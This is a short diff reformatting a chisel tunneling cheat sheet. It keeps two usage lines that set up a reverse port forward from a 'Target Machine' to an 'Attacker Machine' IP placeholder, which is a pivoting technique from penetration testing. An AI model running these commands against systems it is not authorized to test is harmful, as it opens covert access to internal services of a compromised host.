@@ -20,16 +20,14 @@ $ chisel --help
   Version: X.Y.Z
   
   Commands:
-    server - runs chisel in server mode
-    
-    client - runs chisel in client mode
+  server - runs chisel in server mode
+  client - runs chisel in client mode
     
   Read more:
-    https://github.com/jpillora/chisel
+  https://github.com/jpillora/chisel
     
- chisel server -p 9000 --reverse -v   >> Run in Attacker Machine\n
- 
- chisel client <attacker ip:port{differnt port}> R:<attacker ip:port{different port1}>:<localhost:port{running port, need to be forwarded}>   >> Run in Target Machine
+chisel server -p 9000 --reverse -v   >> Run in Attacker Machine\n
+chisel client <attacker ip:port{differnt port}> R:<attacker ip:port{different port1}>:<localhost:port{running port, need to be forwarded}>   >> Run in Target Machine
  
 
 # 
